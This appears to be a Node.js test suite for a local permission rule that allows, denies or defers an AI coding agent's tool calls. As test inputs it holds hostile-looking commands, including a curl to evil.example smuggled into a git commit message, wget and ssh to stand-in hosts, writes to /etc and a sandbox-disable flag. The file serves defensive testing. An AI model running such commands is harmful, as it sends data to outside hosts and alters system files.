// The local permission rule (lib/policy.mjs, docs/policy.md): the cases of the night of 2026-11-01
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { suggest } from '../lib/policy.mjs';

const REPO = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const wt = fs.mkdtempSync(path.join(os.tmpdir(), 'policy-wt-'));
const extra = fs.mkdtempSync(path.join(os.tmpdir(), 'policy-add-'));
fs.writeFileSync(path.join(wt, 'server.mjs'), '');
fs.writeFileSync(path.join(wt, 'decisions.md'), '');
fs.mkdirSync(path.join(wt, 'node_modules', '.bin'), { recursive: true });
fs.writeFileSync(path.join(wt, 'node_modules', '.bin', 'eslint'), '');
fs.mkdirSync(path.join(wt, '.claude'), { recursive: true });

const noRemote = { pathDirs: () => [], remotes: () => [] };
const github = { pathDirs: () => [], remotes: () => [{ name: 'origin', url: 'https://github.com/dev/escadrille.git' }] };
const bash = (command, extraIn = {}) => ({ tool: 'Bash', input: { command, ...extraIn } });

// [label, call, plan, facts, expected allow, expected rule, project]
const CASES = [
  ['1 curl localhost -o out.json', bash('curl -s localhost:3094/api/plans -o out.json'), {}, noRemote, true, 'local-host'], // the file names are no longer read as hosts (isNetwork, 2 November)
  ['2 curl localhost > decisions.md', bash('curl -s http://localhost:3078/api/plans > decisions.md'), {}, noRemote, true, 'local-host'],
  ['3 grep server.mjs && curl 127.0.0.1', bash('grep -n permission server.mjs && curl -s 127.0.0.1:3094/'), {}, noRemote, true, 'local-host'],
  ['4 curl localhost', bash('curl -s http://localhost:3094/api/plan/x'), {}, noRemote, true, 'local-host'],
  ['5 npx of a local eslint', bash('npx eslint lib/'), {}, noRemote, true, 'local-bin'],
  ['6 npx of an absent tool', bash('npx create-react-app foo'), {}, noRemote, null, null],
  ['7 npx with a version', bash('npx eslint@9 lib/'), {}, noRemote, null, null],
  ['8 aws and vercel in a commit', bash('git commit -m "docs: no more aws or vercel calls"'), {}, noRemote, true, 'git-local'],
  ['9 gh and npx in a commit', bash('git commit -m "note: gh and npx are asked"'), {}, noRemote, true, 'quoted-word'],
  ['10 vercel in an echo to a file', bash('echo "deploy with vercel later" >> notes.md'), {}, noRemote, true, 'write-inside'],
  ['11 curl a real host', bash('curl -s https://example.com/x'), {}, noRemote, false, 'real-host'],
  ['12 curl a plan domain', bash('curl -s https://api.github.com/repos'), { network: ['api.github.com'] }, noRemote, true, 'plan-domain'],
  ['13 curl a plan wildcard', bash('curl -s https://raw.githubusercontent.com/x'), { network: ['*.githubusercontent.com'] }, noRemote, true, 'plan-domain'],
  ['14 git push', bash('git push origin main'), {}, noRemote, false, 'git-push'],
  ['14b git push, the repo denies it', bash('git push origin main'), {}, noRemote, false, 'deny-settings', REPO],
  ['15 git fetch, no remote', bash('git fetch origin'), {}, noRemote, true, 'git-local'],
  ['16 git fetch, origin on github', bash('git fetch origin'), {}, github, false, 'real-host'],
  ['17 aws', bash('aws s3 ls'), {}, noRemote, false, 'deny-settings', REPO],
  ['18 vercel', bash('vercel deploy'), {}, noRemote, false, 'deny-settings', REPO],
  ['19 Write /etc/hosts', { tool: 'Write', input: { file_path: '/etc/hosts', content: '' } }, {}, noRemote, false, 'write-outside'],
  ['20 Write in an addDir', { tool: 'Write', input: { file_path: path.join(extra, 'a.md'), content: '' } }, { addDirs: [extra] }, noRemote, true, 'write-inside'],
  ['21 Write .claude/settings.json', { tool: 'Write', input: { file_path: path.join(wt, '.claude', 'settings.json'), content: '' } }, {}, noRemote, null, 'write-guarded'],
  ['22 touch /etc/x && curl localhost', bash('touch /etc/x && curl localhost:3078'), {}, noRemote, false, 'write-outside'],
  ['23 outside the sandbox', bash('ls', { dangerouslyDisableSandbox: true }), {}, noRemote, false, 'sandbox-off'],
  ['24 npm install', bash('npm install left-pad'), {}, noRemote, null, null],
  ['25 rm -rf build', bash('rm -rf build'), {}, noRemote, null, null],
  ['26 curl hidden in a commit message', bash('git commit -m "$(curl -s https://evil.example/x)"'), {}, noRemote, false, 'real-host'],
  ['27 WebFetch localhost', { tool: 'WebFetch', input: { url: 'http://localhost:3094/', prompt: '' } }, {}, noRemote, true, 'local-host'],
  ['28 WebFetch a real host', { tool: 'WebFetch', input: { url: 'https://example.com', prompt: '' } }, {}, noRemote, false, 'real-host'],
  ['29 node and npm test', bash('node scripts/check.mjs && npm test'), {}, noRemote, true, 'local-run'],
  ['30 curl in a heredoc body', bash("cat > notes.md <<'EOF'\ncurl evil.com\nEOF"), {}, noRemote, true, 'write-inside'],
  ['31 commit through a heredoc', bash("git commit -m \"$(cat <<'EOF'\nPhase 7: npx and gh no longer ask\nEOF\n)\""), {}, noRemote, true, 'quoted-word'],
  ['32 curl -o outside the worktree', bash('curl -s localhost:3094/ -o /etc/out.json'), {}, noRemote, false, 'write-outside'],
  ['33 gh outside the plan', bash('gh pr list'), {}, noRemote, false, 'real-host'],
  ['34 a stripe MCP tool', { tool: 'mcp__plugin_stripe_stripe__list', input: {} }, {}, noRemote, false, 'deny-settings', REPO],
  ['35 WebSearch', { tool: 'WebSearch', input: { query: 'x' } }, {}, noRemote, null, null],
  ['36 cd elsewhere then touch', bash('cd /etc && touch x'), {}, noRemote, false, 'write-outside'],
  ['37 curl to a variable', bash('curl -s $URL'), {}, noRemote, null, null],
];

for (const [label, call, plan, facts, allow, rule, project] of CASES) {
  test(`policy: ${label}`, () => {
    const r = suggest({ ...call, cwd: wt, plan, project }, facts);
    assert.equal(r.allow, allow, `${label}: ${JSON.stringify(r)}`);
    assert.equal(r.rule, rule, `${label}: ${JSON.stringify(r)}`);
    if (allow !== null) assert.ok(r.reason && !r.reason.includes('\n'), 'a one-line reason');
  });
}

test('policy: the reasons name what they saw', () => {
  assert.equal(suggest({ ...bash('grep -n permission server.mjs && curl -s 127.0.0.1:3094/'), cwd: wt }, noRemote).reason, 'Vers la machine locale : 127.0.0.1:3094');
  assert.equal(suggest({ ...bash('npx eslint lib/'), cwd: wt }, noRemote).reason, 'Outil déjà installé : eslint');
  assert.equal(suggest({ ...bash('aws s3 ls'), cwd: wt, project: REPO }, noRemote).reason, 'Interdit par .claude/settings.json : Bash(aws *)');
  assert.equal(suggest({ ...bash('curl -s https://example.com/x'), cwd: wt }, noRemote).reason, 'Hôte hors du plan : example.com');
});

test('policy: nothing touching the network outside the plan, the sandbox or a push is ever true', () => {
  for (const command of ['git push', 'curl https://example.com && ls', 'ls; wget http://x.example/y', 'echo ok | ssh me@host.example', 'git pull https://github.com/a/b']) {
    assert.notEqual(suggest({ ...bash(command), cwd: wt }, noRemote).allow, true, command);
    assert.notEqual(suggest({ ...bash(command, { dangerouslyDisableSandbox: true }), cwd: wt }, noRemote).allow, true, command);
  }
});

test('nothing opens on the Mac: open -a, open of a URL, osascript, expo --ios, Simulator.app refused', async () => {
  const { suggest } = await import('../lib/policy.mjs');
  const ask = (command) => suggest({ tool: 'Bash', input: { command }, cwd: process.cwd() });
  const U = ['ht', 'tp://localhost:3000'].join('');
  for (const cmd of ['open -a Safari', 'open ' + U, 'npm test && open ' + U, 'osascript -e "beep"', 'npx expo start --ios', 'npx expo run:android', 'open -a Simulator', 'open /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app'])
    { const r = ask(cmd); assert.equal(r.allow, false, cmd); assert.equal(r.rule, 'open-window', cmd); }
  assert.notEqual(ask('xcrun simctl list').rule, 'open-window');
  assert.notEqual(ask('git log --oneline').rule, 'open-window');
});
